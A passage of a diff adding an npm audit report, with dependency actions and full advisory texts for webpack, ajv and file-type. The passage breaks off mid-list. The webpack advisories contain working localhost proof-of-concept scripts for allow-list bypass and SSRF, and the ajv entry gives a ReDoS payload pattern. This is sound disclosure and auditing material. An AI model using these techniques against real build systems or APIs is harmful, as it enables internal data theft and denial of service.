@@ -1,0 +1,1039 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1158506,
+          "path": "apps__api>supertest>superagent>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158507,
+          "path": "apps__api>supertest>superagent>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "qs",
+      "target": "6.16.1",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1241257,
+          "path": "apps__api>pino-pretty>fast-copy",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "fast-copy",
+      "target": "4.2.0",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "webpack",
+      "resolves": [
+        {
+          "id": 1113041,
+          "path": "apps__api>@nestjs/cli>webpack",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113042,
+          "path": "apps__api>@nestjs/cli>webpack",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ajv",
+      "resolves": [
+        {
+          "id": 1113715,
+          "path": "apps__api>@nestjs/cli>@angular-devkit/core>ajv",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "file-type",
+      "resolves": [
+        {
+          "id": 1114301,
+          "path": "apps__api>@nestjs/common>file-type",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114726,
+          "path": "apps__api>@nestjs/common>file-type",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@nestjs/core",
+      "resolves": [
+        {
+          "id": 1117063,
+          "path": "apps__api>@nestjs/core",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "qs",
+      "resolves": [
+        {
+          "id": 1119502,
+          "path": "apps__api>@nestjs/platform-express>body-parser>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158506,
+          "path": "apps__api>@nestjs/platform-express>body-parser>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158507,
+          "path": "apps__api>@nestjs/platform-express>body-parser>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "body-parser",
+      "resolves": [
+        {
+          "id": 1123977,
+          "path": "apps__api>@nestjs/platform-express>body-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "postcss",
+      "resolves": [
+        {
+          "id": 1130709,
+          "path": "apps__landing>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "csv-parse",
+      "resolves": [
+        {
+          "id": 1193670,
+          "path": "apps__api>csv-parse",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vitest",
+      "resolves": [
+        {
+          "id": 1193683,
+          "path": "apps__web>vitest",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@vitest/mocker",
+      "resolves": [
+        {
+          "id": 1193684,
+          "path": "apps__web>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "multer",
+      "resolves": [
+        {
+          "id": 1239935,
+          "path": "apps__api>@nestjs/platform-express>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "braces",
+      "resolves": [
+        {
+          "id": 1240992,
+          "path": ".>lint-staged>micromatch>braces",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "sprintf-js",
+      "resolves": [
+        {
+          "id": 1241202,
+          "path": "apps__api>jest>@jest/core>@jest/transform>babel-plugin-istanbul>@istanbuljs/load-nyc-config>js-yaml>argparse>sprintf-js",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "postcss-selector-parser",
+      "resolves": [
+        {
+          "id": 1241232,
+          "path": "apps__landing>tailwindcss>postcss-selector-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1241491,
+          "path": "apps__landing>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241494,
+          "path": "apps__landing>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1113041": {
+      "findings": [
+        {
+          "version": "5.97.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack/security/advisories/GHSA-8fgc-7cc6-rx7x\n- https://nvd.nist.gov/vuln/detail/CVE-2025-68458\n- https://github.com/advisories/GHSA-8fgc-7cc6-rx7x",
+      "created": "2026-02-05T18:38:10.000Z",
+      "id": 1113041,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nWhen `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) can be bypassed to fetch resources from **hosts outside `allowedUris`** by using crafted URLs that include **userinfo** (`username:password@host`). If `allowedUris` enforcement relies on a **raw string prefix check** (e.g., `uri.startsWith(allowed)`), a URL that *looks* allow-listed can pass validation while the actual network request is sent to a different authority/host after URL parsing. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (outbound requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion** (the fetched response is treated as module source and bundled). In my reproduction, the internal response was also persisted in the buildHttp cache.\n\nReproduced on:\n- webpack version: **5.104.0**\n- Node version: **v18.19.1**\n\n### Details\n**Root cause (high level):** `allowedUris` validation can be performed on the raw URI string, while the actual request destination is determined later by parsing the URL (e.g., `new URL(uri)`), which interprets the **authority** as the part after `@`.\n\nExample crafted URL:\n- `http://127.0.0.1:9000@127.0.0.1:9100/secret.js`\n\nIf the allow-list is `[\"http://127.0.0.1:9000\"]`, then:\n- Raw string check:  \n  `crafted.startsWith(\"http://127.0.0.1:9000\")` → **true**\n- URL parsing (WHAT `new URL()` will contact):  \n  `origin` → `http://127.0.0.1:9100` (host/port after `@`)\n\nAs a result, webpack fetches `http://127.0.0.1:9100/secret.js` even though `allowedUris` only included `http://127.0.0.1:9000`.\n\n**Evidence from reproduction:**\n- Server logs showed the internal-only endpoint being fetched:\n  - `[internal] 200 /secret.js served (...)` (observed multiple times)\n- Attacker-side build output showed:\n  - the internal secret marker was present in the **bundle**\n  - the internal secret marker was present in the **buildHttp cache**\n\n<img width=\"1651\" height=\"381\" alt=\"image-2\" src=\"https://github.com/user-attachments/assets/8fd81b35-0d4f-424b-b60e-0a2582a8b492\" />\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-userinfo-poc && cd split-userinfo-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst http = require(\"http\");\n\nconst ALLOWED_PORT = 9000;   // allowlisted-looking host\nconst INTERNAL_PORT = 9100;  // actual target if bypass succeeds\n\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `// internal-only\\n` +\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \"ok\";\\n`;\n\nfunction listen(port, handler) {\n  return new Promise(resolve => {\n    const s = http.createServer(handler);\n    s.listen(port, \"127.0.0.1\", () => resolve(s));\n  });\n}\n\n(async () => {\n  // \"Allowed\" host (should NOT be contacted if bypass works as intended)\n  await listen(ALLOWED_PORT, (req, res) => {\n    console.log(`[allowed-host] ${req.method} ${req.url} (should NOT be hit in userinfo bypass)`);\n    res.statusCode = 200;\n    res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n    res.end(`export default \"ALLOWED_HOST_WAS_HIT_UNEXPECTEDLY\";\\n`);\n  });\n\n  // Internal-only service (SSRF-like target)\n  await listen(INTERNAL_PORT, (req, res) => {\n    if (req.url === \"/secret.js\") {\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      res.statusCode = 200;\n      res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n      res.end(internalPayload);\n      return;\n    }\n    console.log(`[internal] 404 ${req.method} ${req.url}`);\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  console.log(\"\\nServers up:\");\n  console.log(`- allowed-host (should NOT be contacted): http://127.0.0.1:${ALLOWED_PORT}/`);\n  console.log(`- internal target (should be contacted if vulnerable): http://127.0.0.1:${INTERNAL_PORT}/secret.js`);\n})();\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst path = require(\"path\");\nconst os = require(\"os\");\nconst fs = require(\"fs/promises\");\nconst webpack = require(\"webpack\");\n\nfunction fmtBool(b) { return b ? \"✅\" : \"❌\"; }\n\nasync function walk(dir) {\n  const out = [];\n  let items;\n  try { items = await fs.readdir(dir, { withFileTypes: true }); }\n  catch { return out; }\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    const s1 = buf.toString(\"utf8\");\n    if (s1.includes(needle)) return true;\n    const s2 = buf.toString(\"latin1\");\n    return s2.includes(needle);\n  } catch {\n    return false;\n  }\n}\n\n(async () => {\n  const webpackVersion = require(\"webpack/package.json\").version;\n\n  const ALLOWED_PORT = 9000;\n  const INTERNAL_PORT = 9100;\n\n  // NOTE: allowlist is intentionally specified without a trailing slash\n  // to demonstrate the risk of raw string prefix checks.\n  const allowedUri = `http://127.0.0.1:${ALLOWED_PORT}`;\n\n  // Crafted URL using userinfo so that:\n  // - The string begins with allowedUri\n  // - The actual authority (host:port) after '@' is INTERNAL_PORT\n  const crafted = `http://127.0.0.1:${ALLOWED_PORT}@127.0.0.1:${INTERNAL_PORT}/secret.js`;\n  const parsed = new URL(crafted);\n\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \"webpack-httpuri-userinfo-poc-\"));\n  const srcDir = path.join(tmp, \"src\");\n  const distDir = path.join(tmp, \"dist\");\n  const cacheDir = path.join(tmp, \".buildHttp-cache\");\n  const lockfile = path.join(tmp, \"webpack.lock\");\n  const bundlePath = path.join(distDir, \"bundle.js\");\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \"index.js\"),\n    `import { secret } from ${JSON.stringify(crafted)};\nconsole.log(\"LEAKED_SECRET:\", secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \"development\",\n    entry: \"./src/index.js\",\n    output: { path: distDir, filename: \"bundle.js\" },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedUri],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  console.log(\"\\n[ENV]\");\n  console.log(`- webpack version: ${webpackVersion}`);\n  console.log(`- node version:    ${process.version}`);\n  console.log(`- allowedUris:     ${JSON.stringify([allowedUri])}`);\n\n  console.log(\"\\n[CRAFTED URL]\");\n  console.log(`- import specifier: ${crafted}`);\n  console.log(`- WHAT startsWith() sees: begins with \"${allowedUri}\" => ${fmtBool(crafted.startsWith(allowedUri))}`);\n  console.log(`- WHAT URL() parses:`);\n  console.log(`  - username: ${JSON.stringify(parsed.username)} (userinfo)`);\n  console.log(`  - password: ${JSON.stringify(parsed.password)} (userinfo)`);\n  console.log(`  - hostname: ${parsed.hostname}`);\n  console.log(`  - port:     ${parsed.port}`);\n  console.log(`  - origin:   ${parsed.origin}`);\n  console.log(`  - NOTE: request goes to origin above (host/port after @), not to \"${allowedUri}\"`);\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) => {\n    try {\n      if (err) throw err;\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n\n      if (stats.hasErrors()) {\n        console.error(\"\\n[WEBPACK ERRORS]\");\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \"utf8\");\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const foundSecret = m ? m[0] : null;\n\n      console.log(\"\\n[RESULT]\");\n      console.log(`- temp dir:  ${tmp}`);\n      console.log(`- bundle:    ${bundlePath}`);\n      console.log(`- lockfile:  ${lockfile}`);\n      console.log(`- cacheDir:  ${cacheDir}`);\n\n      console.log(\"\\n[SECURITY CHECK]\");\n      console.log(`- bundle contains INTERNAL_ONLY_SECRET_* : ${fmtBool(!!foundSecret)}`);\n\n      if (foundSecret) {\n        const lockHit = await fileContains(lockfile, foundSecret);\n\n        const cacheFiles = await walk(cacheDir);\n        let cacheHit = false;\n        for (const f of cacheFiles) {\n          if (await fileContains(f, foundSecret)) { cacheHit = true; break; }\n        }\n\n        console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n        console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      }\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() => {});\n    }\n  });\n})();\n```\n\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected vs Actual\n\nExpected: The import should be blocked because the effective request destination is http://127.0.0.1:9100/secret.js, which is outside allowedUris (only http://127.0.0.1:9000 is allow-listed).\n\nActual: The crafted URL passes the allow-list prefix validation, webpack fetches the internal-only resource on port 9100 (confirmed by server logs), and the secret marker appears in the bundle and buildHttp cache.\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to build-time SSRF behavior and untrusted content inclusion in build outputs.\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary. If an attacker can influence the imported HTTP(S) specifier (e.g., via source contribution, dependency manipulation, or configuration), they can cause outbound requests from the build environment to endpoints outside the allow-list (including internal-only services, subject to network reachability). The fetched response can be treated as module source and included in build outputs and persisted in the buildHttp cache, increasing the risk of leakage or supply-chain contamination.",
+      "reported_by": null,
+      "title": "webpack buildHttp: allowedUris allow-list bypass via URL userinfo (@) leading to build-time SSRF behavior",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-68458"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "webpack",
+      "vulnerable_versions": ">=5.49.0 <=5.104.0",
+      "github_advisory_id": "GHSA-8fgc-7cc6-rx7x",
+      "recommendation": "Upgrade to version 5.104.1 or later",
+      "patched_versions": ">=5.104.1",
+      "updated": "2026-02-06T14:39:32.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-8fgc-7cc6-rx7x"
+    },
+    "1113042": {
+      "findings": [
+        {
+          "version": "5.97.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack/security/advisories/GHSA-38r7-794h-5758\n- https://nvd.nist.gov/vuln/detail/CVE-2025-68157\n- https://github.com/advisories/GHSA-38r7-794h-5758",
+      "created": "2026-02-05T18:35:28.000Z",
+      "id": 1113042,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nWhen `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache.\n\n### Details\nIn the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the `Location` URL without re-checking whether the redirected URL is within `allowedUris`.\n\nPractical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs.\n\n**Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache.\n\n<img width=\"1648\" height=\"461\" alt=\"image\" src=\"https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524\" />\n\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-ssrf-poc && cd split-ssrf-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst http = require(\"http\");\nconst url = require(\"url\");\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`;\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \"ok\";\\n`;\n\nfunction start(port, handler) {\n  return new Promise(resolve => {\n    const s = http.createServer(handler);\n    s.listen(port, \"127.0.0.1\", () => resolve(s));\n  });\n}\n\n(async () => {\n  // Internal-only service (SSRF target)\n  await start(internalPort, (req, res) => {\n    if (req.url === \"/secret.js\") {\n      res.statusCode = 200;\n      res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n      res.end(internalPayload);\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      return;\n    }\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  // Allowed host (redirector)\n  await start(allowedPort, (req, res) => {\n    const parsed = url.parse(req.url, true);\n\n    if (parsed.pathname === \"/redirect.js\") {\n      const to = parsed.query.to || internalUrlDefault;\n\n      // Safety guard: only allow redirecting to localhost internal service in this PoC\n      if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) {\n        res.statusCode = 400;\n        res.end(\"to must be internal-only in this PoC\");\n        console.log(`[allowed] blocked redirect to: ${to}`);\n        return;\n      }\n\n      res.statusCode = 302;\n      res.setHeader(\"Location\", to);\n      res.end(\"redirecting\");\n      console.log(`[allowed] 302 /redirect.js -> ${to}`);\n      return;\n    }\n\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  console.log(`\\nServer running:`);\n  console.log(`- allowed host:  http://127.0.0.1:${allowedPort}/redirect.js`);\n  console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`);\n})();\n```\n\n#### 3) Create attacker.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst path = require(\"path\");\nconst os = require(\"os\");\nconst fs = require(\"fs/promises\");\nconst webpack = require(\"webpack\");\nconst webpackPkg = require(\"webpack/package.json\");\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst allowedBase = `http://127.0.0.1:${allowedPort}/`;\nconst internalTarget = `http://127.0.0.1:${internalPort}/secret.js`;\nconst entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`;\n\nasync function walk(dir) {\n  const out = [];\n  const items = await fs.readdir(dir, { withFileTypes: true });\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    return buf.toString(\"utf8\").includes(needle) || buf.toString(\"latin1\").includes(needle);\n  } catch {\n    return false;\n  }\n}\n\nasync function findInFiles(files, needle) {\n  const hits = [];\n  for (const f of files) if (await fileContains(f, needle)) hits.push(f);\n  return hits;\n}\n\nconst fmtBool = b => (b ? \"✅\" : \"❌\");\n\n(async () => {\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \"webpack-attacker-\"));\n  const srcDir = path.join(tmp, \"src\");\n  const distDir = path.join(tmp, \"dist\");\n  const cacheDir = path.join(tmp, \".buildHttp-cache\");\n  const lockfile = path.join(tmp, \"webpack.lock\");\n  const bundlePath = path.join(distDir, \"bundle.js\");\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \"index.js\"),\n    `import { secret } from ${JSON.stringify(entryUrl)};\nconsole.log(\"LEAKED_SECRET:\", secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \"development\",\n    entry: \"./src/index.js\",\n    output: { path: distDir, filename: \"bundle.js\" },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedBase],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) => {\n    try {\n      if (err) throw err;\n\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n      if (stats.hasErrors()) {\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \"utf8\");\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const secret = m ? m[0] : null;\n\n      console.log(\"\\n[ATTACKER RESULT]\");\n      console.log(`- webpack version: ${webpackPkg.version}`);\n      console.log(`- node version: ${process.version}`);\n      console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`);\n      console.log(`- imported URL (allowed only): ${entryUrl}`);\n      console.log(`- temp dir: ${tmp}`);\n      console.log(`- lockfile: ${lockfile}`);\n      console.log(`- cacheDir: ${cacheDir}`);\n      console.log(`- bundle:   ${bundlePath}`);\n\n      if (!secret) {\n        console.log(\"\\n[SECURITY SUMMARY]\");\n        console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`);\n        return;\n      }\n\n      const lockHit = await fileContains(lockfile, secret);\n\n      let cacheFiles = [];\n      try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; }\n      const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length > 0 : false;\n\n      const allTmpFiles = await walk(tmp);\n      const allHits = await findInFiles(allTmpFiles, secret);\n\n      console.log(`\\n- extracted secret marker from bundle: ${secret}`);\n\n      console.log(\"\\n[SECURITY SUMMARY]\");\n      console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`);\n      console.log(`- Internal target (SSRF-like): ${internalTarget}`);\n      console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`);\n      console.log(`- ACTUAL: internal content treated as module and bundled`);\n\n      console.log(\"\\n[EVIDENCE CHECKLIST]\");\n      console.log(`- bundle contains secret:   ${fmtBool(true)}`);\n      console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n\n      console.log(\"\\n[PERSISTENCE CHECK] files containing secret\");\n      for (const f of allHits.slice(0, 30)) console.log(`- ${f}`);\n      if (allHits.length > 30) console.log(`- ... and ${allHits.length - 30} more`);\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() => {});\n    }\n  });\n})();\n```\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected\n\nExpected: Redirect target should be rejected if not in allowedUris (only http://127.0.0.1:9000/ is allowed).\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled).\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can:\n\ntrigger network requests from the build machine to internal-only services (SSRF behavior),\n\ncause content from outside the allow-list to be bundled into build outputs,\n\nand cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.",
+      "reported_by": null,
+      "title": "webpack buildHttp HttpUriPlugin allowedUris bypass via HTTP redirects → SSRF + cache persistence",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-68157"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "webpack",
+      "vulnerable_versions": ">=5.49.0 <5.104.0",
+      "github_advisory_id": "GHSA-38r7-794h-5758",
+      "recommendation": "Upgrade to version 5.104.0 or later",
+      "patched_versions": ">=5.104.0",
+      "updated": "2026-02-06T14:39:27.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-38r7-794h-5758"
+    },
+    "1113715": {
+      "findings": [
+        {
+          "version": "8.12.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-69873\n- https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md\n- https://github.com/ajv-validator/ajv/pull/2586\n- https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5\n- https://github.com/ajv-validator/ajv/releases/tag/v8.18.0\n- https://github.com/ajv-validator/ajv/pull/2588\n- https://github.com/ajv-validator/ajv/releases/tag/v6.14.0\n- https://github.com/advisories/GHSA-2g4f-4pwh-qvx6\n- https://github.com/ajv-validator/ajv/pull/2590\n- https://github.com/github/advisory-database/pull/6991",
+      "created": "2026-02-11T21:30:39.000Z",
+      "id": 1113715,
+      "npm_advisory_id": null,
+      "overview": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "reported_by": null,
+      "title": "ajv has ReDoS when using `$data` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-69873"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ajv",
+      "vulnerable_versions": ">=7.0.0-alpha.0 <8.18.0",
+      "github_advisory_id": "GHSA-2g4f-4pwh-qvx6",
+      "recommendation": "Upgrade to version 8.18.0 or later",
+      "patched_versions": ">=8.18.0",
+      "updated": "2026-03-02T21:58:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+    },
+    "1114301": {
+      "findings": [
+        {
+          "version": "20.4.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sindresorhus/file-type/security/advisories/GHSA-5v7r-6r5c-r473\n- https://nvd.nist.gov/vuln/detail/CVE-2026-31808\n- https://github.com/sindresorhus/file-type/commit/319abf871b50ba2fa221b4a7050059f1ae096f4f\n- https://github.com/advisories/GHSA-5v7r-6r5c-r473",
+      "created": "2026-03-10T23:57:09.000Z",
+      "id": 1114301,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA denial of service vulnerability exists in the ASF (WMV/WMA) file type detection parser. When parsing a crafted input where an ASF sub-header has a `size` field of zero, the parser enters an infinite loop. The `payload` value becomes negative (-24), causing `tokenizer.ignore(payload)` to move the read position backwards, so the same sub-header is read repeatedly forever.\n\nAny application that uses `file-type` to detect the type of untrusted/attacker-controlled input is affected. An attacker can stall the Node.js event loop with a 55-byte payload.\n\n### Patches\nFixed in version 21.3.1. Users should upgrade to >= 21.3.1.\n\n### Workarounds\nValidate or limit the size of input buffers before passing them to `file-type`, or run file type detection in a worker thread with a timeout.\n\n### References\n- Fix commit: 319abf871b50ba2fa221b4a7050059f1ae096f4f\n\n### Reporter\n\ncrnkovic@lokvica.com",
+      "reported_by": null,
+      "title": "file-type affected by infinite loop in ASF parser on malformed input with zero-size sub-header",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-31808"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "file-type",
+      "vulnerable_versions": ">=13.0.0 <21.3.1",
+      "github_advisory_id": "GHSA-5v7r-6r5c-r473",
+      "recommendation": "Upgrade to version 21.3.1 or later",
+      "patched_versions": ">=21.3.1",
